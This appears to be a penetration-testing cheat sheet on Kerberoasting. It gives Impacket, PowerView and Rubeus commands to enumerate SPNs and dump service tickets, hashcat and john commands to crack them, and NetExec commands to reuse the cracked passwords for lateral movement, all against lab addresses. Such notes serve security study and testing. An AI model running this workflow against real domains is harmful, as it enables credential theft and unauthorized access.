# Kerberoasting

## Overview

**Kerberoasting** is an attack that allows an authenticated domain user to extract **service account credentials** from Active Directory by abusing how **Service Principal Names (SPNs)** are tied to Kerberos service tickets.

The attack is possible when:

- A user account in AD is mapped to an SPN (e.g., MSSQLSvc/host.domain)
    
- The user requests a Kerberos service ticket (TGS) for that SPN
    
- The TGS is **encrypted with the service account’s NTLM hash**
    
- The ticket can be **cracked offline** to recover the password
    

---

## Pre-Access: SPN Enumeration with Valid Creds

> These steps assume you have **domain user credentials** but no shell.

### Tool: Impacket `GetUserSPNs.py`

```bash
python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP>
```

**Example:**

```bash
python3 GetUserSPNs.py oscp.exam/web_svc:Diamond1 -dc-ip 10.10.110.146
```

Output:

```
ServicePrincipalName    Name        PasswordLastSet     LastLogon
----------------------  ----------  ------------------- ------------
MSSQLSvc/sql01.htb.local:1433  svc_sql      2023-01-10 14:12:00   ...

$krb5tgs$23$*svc_sql@HTB.EXAMPLE:...
```

The `$krb5tgs$...` line is the **TGS ticket**, crackable offline with hashcat or john.

> Use `-request` to actively request the ticket and dump it in hashcat format:

```bash
python3 GetUserSPNs.py htb.example/web_svc:Password1 -dc-ip 10.10.110.146 -request
```

> use `hashcat -m 13100` for this hash typ.

---

## Post-Access: SPN Enumeration from a Shell

> You’ve landed a shell on a domain-joined machine using SMB/WinRM. Now enumerate SPNs and extract tickets.

### Option A: PowerView (PowerShell)

```powershell
Import-Module .\PowerView.ps1
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
```

### Option B: Rubeus (C# / OPSEC-friendly)

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

Options:

- Add `/user:svc_sql` to limit results
    
- Use `/format:hashcat` for compatibility with `hashcat`
    

---

## Ticket Cracking: Offline Stage

### Extracted tickets are in `$krb5tgs$23$...` format.

### Crack with Hashcat

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

### Crack with John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hashes.kerberoast
```

---

## Post-Crack: Reuse the Credentials

Cracked password (example):

```
svc_sql : Summer2023!
```

Use with NetExec for lateral movement:

```bash
nxc smb 10.10.110.150 -u svc_sql -p 'Summer2023!' -d htb.example --shares
```

Or test with WinRM:

```bash
nxc winrm 10.10.110.150 -u svc_sql -p 'Summer2023!' -d htb.example --exec "whoami"
```

---

## Summary: Kerberoasting Workflow

|Phase|Tool|Command Example|
|---|---|---|
|Enumerate SPNs|`GetUserSPNs.py`|`python3 GetUserSPNs.py htb.local/user:pass -dc-ip <ip>`|
|Extract Tickets|`GetUserSPNs.py -request`|Appends TGS ticket to output|
||`Rubeus kerberoast`|Dumps all roastable SPNs locally|
|Crack Tickets|`hashcat`|`hashcat -m 13100 hash.txt rockyou.txt`|
||`john`|`john --format=krb5tgs --wordlist=... hash.txt`|
|Reuse Creds|`NetExec / WinRM / RDP`|Use cracked creds to enumerate or laterally move|

---

## Notes

- SPNs tied to **user accounts** are crackable; SPNs tied to machine accounts are not useful for Kerberoasting
    
- Use `BloodHound` to identify **high-priv accounts with SPNs**
    
- Kerberoasting can lead directly to **local or domain admin** access if service accounts are misconfigured
    

---

## References

- [Impacket - GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
    
- [GhostPack Rubeus](https://github.com/GhostPack/Rubeus)
    
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
    
- [BloodHound AD](https://bloodhound.readthedocs.io/en/latest/)
    
- [Hashcat Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
    